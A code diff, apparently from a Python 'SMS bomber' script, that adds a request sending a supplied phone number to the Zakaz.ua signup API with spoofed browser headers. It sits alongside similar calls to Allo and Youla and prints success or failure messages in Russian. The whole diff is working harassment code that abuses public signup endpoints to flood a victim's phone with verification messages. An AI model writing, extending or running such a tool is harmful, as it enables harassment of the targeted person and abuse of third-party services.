@@ -198,6 +198,18 @@ def start():
         except:
             print(fail + "Allo не отправлен" + Style.RESET_ALL)
         try:
+            requests.post("https://stores-api.zakaz.ua/user/signup/", json={"phone":phone},
+            headers={
+    'Accept': '*/*',
+    'Content-Type': 'application/json',
+    'Referer': 'https://megamarket.zakaz.ua/ru/products/megamarket00000000122023/sausages-farro/',
+    'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
+    'x-chain': 'megamarket'
+})
+            print(nice + "Zakaz.ua отправлено!" + Style.RESET_ALL)
+        except:
+            print(fail + "Zakaz.ua не отправлен" + Style.RESET_ALL)
+        try:
             requests.post(
                 "https://youla.ru/web-api/auth/request_code",
                 data={"phone": phone},
